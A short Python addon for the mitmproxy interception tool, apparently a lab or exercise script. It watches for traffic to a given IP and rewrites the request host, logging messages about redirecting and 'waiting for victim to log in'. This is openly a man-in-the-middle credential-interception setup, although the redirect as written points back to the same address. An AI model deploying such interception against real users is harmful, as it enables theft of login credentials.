from mitmproxy import http
from mitmproxy import ctx

flag = False

ran = False


def request(flow: http.HTTPFlow) -> None:
    global ran

    if "192.0.0.0" in flow.request.pretty_host:
        if not ran:
            ctx.log.info("Target host IP detected")
            ctx.log.info("Redirecting...")
            flow.request.host = "192.0.0.0"
            ctx.log.info("Waiting for victim to log in...")
            ran = True
        else:
            ctx.log.info("Victim has tried to log in, stopping redirection...")
